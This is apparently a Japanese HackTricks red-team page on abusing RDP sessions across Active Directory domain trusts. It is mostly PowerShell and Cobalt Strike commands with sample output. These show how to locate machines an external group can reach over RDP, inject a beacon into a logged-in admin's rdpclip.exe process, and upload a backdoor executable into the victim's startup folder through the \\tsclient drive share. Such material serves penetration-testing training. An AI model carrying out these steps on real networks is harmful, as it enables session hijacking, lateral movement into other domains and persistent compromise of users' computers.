# RDPセッションの悪用

{{#include ../../banners/hacktricks-training.md}}

## RDPプロセスインジェクション

もし**外部グループ**が現在のドメイン内の任意の**コンピュータ**に**RDPアクセス**を持っている場合、**攻撃者**はその**コンピュータを侵害し、彼を待つ**ことができます。

そのユーザーがRDP経由でアクセスすると、**攻撃者はそのユーザーのセッションにピボットし**、外部ドメインでの権限を悪用することができます。
```powershell
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
他のツールを使用してセッションを盗む**他の方法を確認してください** [**このページで。**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

ユーザーが**RDPを介してマシンにアクセス**し、**攻撃者**が**待機**している場合、攻撃者は**ユーザーのRDPセッションにビーコンを注入**することができ、**被害者がRDP経由でアクセスする際にドライブをマウントした場合、**攻撃者はそれにアクセスできる**。

この場合、**被害者の** **元のコンピュータ**を**バックドア**を**スタートアップフォルダ**に書き込むことで**妥協**することができます。
```powershell
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
{{#include ../../banners/hacktricks-training.md}}
